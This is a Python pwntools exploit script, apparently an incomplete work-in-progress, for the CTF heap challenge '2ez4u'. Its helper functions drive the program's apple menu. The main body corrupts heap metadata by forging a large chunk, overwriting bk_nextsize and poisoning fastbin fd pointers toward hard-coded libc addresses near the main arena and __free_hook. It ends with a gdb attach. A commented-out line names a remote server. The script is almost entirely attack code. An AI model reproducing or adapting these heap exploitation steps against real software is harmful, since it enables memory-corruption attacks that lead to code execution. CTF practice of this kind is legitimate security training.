# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
# name = './2ez4u-patch'
name = './2ez4u'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

def Add(color,value,num,desc):
    r.recvuntil("your choice:")
    r.sendline("1")
    r.sendline(str(color))
    r.sendline(str(value))
    r.sendline(str(num))
    r.recvuntil("description length?(1-1024):")
    r.sendline(str(len(desc)))
    r.recvuntil("description of the apple:")
    r.send(desc)

def Edit(index, color, value, num, desc):
    r.recvuntil("your choice:")
    r.sendline("3")
    r.recvuntil("which?(0-15):")
    r.sendline(str(index))
    r.sendline(str(color))
    r.sendline(str(value))
    r.sendline(str(num))
    r.recvuntil("new description of the apple:")
    r.send(desc)

def add(desc):
    Add(1,1,1,desc)

def add2(size, desc):
    r.recvuntil("your choice:")
    r.sendline("1")
    r.sendline("1")
    r.sendline("1")
    r.sendline("1")
    r.recvuntil("description length?(1-1024):")
    r.sendline(str(size))
    r.recvuntil("description of the apple:")
    r.send(desc)

def d(index):
    r.recvuntil("your choice:")
    r.sendline("2")
    r.recvuntil("which?(0-15):")
    r.sendline(str(index))

def edit(index, desc):
    Edit(index,2,1000,17,desc)

def show(index):
    r.recvuntil("your choice:")
    r.sendline("4")
    r.recvuntil("which?(0-15):")
    r.sendline(str(index))


add("B") # 0
add("A"*0x3e0) #1
add("B") #2
add("A"*0x3f0) #3
add("B") #4
add("A"*0x3e0) #5
add("B") #6
add("A"*0x400) #7
add("B"*0x50) #8
add("B"*0x50) #9
add("B"*0x50) #a
add("B"*0x10) #b
add("B"*0x10) #c
add("B"*0x10) #d
d(5)
d(1)
d(3)
add("A"*0x400) #1  0x0000555555758140 最下面，top上面
# show(3)

# r.recvuntil("description:")
# heap_base = u64(r.recv(6).ljust(8, '\x00')) - 0x30

# print("heap_base", hex(heap_base))

# d(7)

fake = 0x555555758010
fake_f = fake+0x30
payload = ""
payload += p64(0)+p64(0)+p64(0)
payload += "A"*0x300
payload += p64(0)+p64(0x411) # fake chunk 0x555555757d00
payload += p64(fake_f-0x18)+p64(fake_f-0x10) # ??
payload += p64(0)+p64(0) # needed!
payload += p64(fake)
payload += p64(0x4142)
edit(7, payload+"\n") # 0x0000555555757ce0
edit(1, 0x128*"B"+p64(0x410)+p64(0x21)+'\n')

payload = ""
payload += p64(fake) # bk_nextsize
edit(5 , payload+"\n") #  0x5555557578a0 

add2(0x3f0, "A\n") # 3

edit(5 , p64(0x555555757460)+"\n") #repair

add2(0x3e0,"\n")
add2(0x3e0,"\n")
add2(0x3f0,"\n")
d(9)
d(8)

evil_fd = 0x7ffff7dd1aed
edit(3, (0xb8)*"A"+p64(0x42)+p64(0x71)+p64(evil_fd)+"\n")

add("A"*0x50)
add2(0x50, "\n") #9

edit(9, p64(0)+"A"*3+2*p64(0)+p64(0)*5+  p64(0x3f)+"\n") # 0x7ffff7dd1b10-0x100

d(11)
d(12)

evil_fd = 0x7ffff7dd1b50
edit(3,0x240*"B"+p64(0x31)+p64(evil_fd)+p64(0)+"\n")
add2(0x10,"\n")
add2(0x10,"\n") #12

target = 0x7ffff7dd37a8-0xb58 #free_hook+0xb58
edit(12, p64(target)+"\n") #???how to choice

# add2(0x400,"\n")
# add2(0x400,"\n")
# add2(0x400,"\n")

edit(9, p64(0)+"A"*3+2*p64(0)+p64(0)*10+"\n") # clear

d(2)
# d(10)
# d(11)

# add2(0x3e0,"\n")
# add2(0x3e0)


print(str(r.proc.pid))

gdb.attach(r, """
heap
x/20gx 0x0202040+0x555555554000
bins
define fu
    set $b = 0x555555756040
    if $argc > 0
        x/2gx $b+0x10*$arg0
    else

    end
    if $argc == 2
        # x/$arg1gx ($k1 ^ *(long *)($b + ($arg0*0x10) ))-0x10
    end
end

""");
print(str(r.proc.pid))

r.interactive()

